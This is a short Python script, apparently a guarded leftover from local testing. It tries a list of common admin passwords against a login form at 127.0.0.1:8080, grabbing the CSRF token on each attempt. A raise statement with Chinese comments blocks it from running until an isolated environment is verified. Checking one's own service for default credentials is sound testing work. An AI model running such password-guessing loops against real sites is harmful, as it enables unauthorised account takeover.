#!/usr/bin/env python3
# 隔离数据库、服务和请求目标未完成验证前，禁止导入或执行本脚本。
raise RuntimeError('遗留脚本已阻止：尚未证明隔离数据库与自有服务的安全边界')

import re, requests
BASE='http://127.0.0.1:8080'
def csrf(h):
    m=re.search(r'name="csrf_token"\s+value="([^"]+)"',h) or re.search(r'meta name="csrf-token" content="([^"]+)"',h)
    return m.group(1) if m else None
for pwd in ['admin','Admin@123','Admin123','123456','admin123','Admin@1234','admin']:
    s=requests.Session()
    r=s.get(BASE+'/login'); tok=csrf(r.text)
    rr=s.post(BASE+'/login',data={'username':'admin','password':pwd,'csrf_token':tok,'login_mode':'admin'},allow_redirects=False,timeout=20)
    print(f'{pwd!r}: {rr.status_code} {rr.headers.get("Location","")}')